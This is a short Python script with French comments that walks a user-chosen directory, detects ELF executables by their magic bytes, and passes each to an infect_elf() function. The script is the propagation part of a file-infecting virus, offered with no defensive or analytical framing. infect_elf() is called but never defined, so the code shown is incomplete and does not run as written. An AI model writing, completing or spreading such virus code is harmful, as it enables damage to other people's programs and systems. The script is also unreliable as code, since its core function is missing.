import os

def scan_and_infect(directory):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)

            # Vérifier si c'est un fichier ELF
            try:
                with open(file_path, "rb") as f:
                    magic = f.read(4)
                    if magic == b'\x7fELF':
                        print(f"Fichier ELF trouvé : {file_path}")
                        infect_elf(file_path)
            except Exception as e:
                print(f"Erreur lors du traitement de {file_path}: {e}")

if __name__ == "__main__":
    directory = input("Entrez le chemin du répertoire à scanner : ")
    if os.path.isdir(directory):
        scan_and_infect(directory)
    else:
        print(f"{directory} n'est pas un répertoire valide.")
